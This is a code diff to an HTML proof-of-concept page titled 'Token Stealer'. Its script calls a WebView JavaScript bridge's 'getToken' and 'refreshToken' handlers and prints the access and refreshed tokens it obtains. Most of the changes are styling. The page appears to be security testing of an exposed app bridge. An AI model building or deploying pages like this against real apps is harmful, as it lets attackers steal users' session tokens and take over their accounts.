@@ -1,15 +1,24 @@
 <!DOCTYPE html>
 <html>
 <head>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <title>Token Stealer</title>
   <style>
-    body {
+    html, body {
+      margin: 0;
+      padding: 0;
+      width: 100%;
+      height: 100%;
       background: #000;
       color: #0f0;
       font-family: monospace;
       white-space: pre-wrap;
-      padding: 20px;
       font-size: 16px;
+      box-sizing: border-box;
+    }
+
+    #output {
+      padding: 20px;
     }
   </style>
 </head>
@@ -44,7 +53,6 @@
 
       // getToken
       bridge.callHandler("getToken", null, function (res) {
-
         try {
           const obj = JSON.parse(res);
           log("[+] Access Token: " + (obj.token || "(no token)"));
@@ -53,9 +61,6 @@
           // refreshToken
           log("[*] Calling refreshToken...");
           bridge.callHandler("refreshToken", null, function (newRes) {
-            log("[*] refreshToken response:");
-            log(newRes);
-
             try {
               const refreshed = JSON.parse(newRes);
               log("[+] Refreshed Token: " + (refreshed.token || "(no token)"));
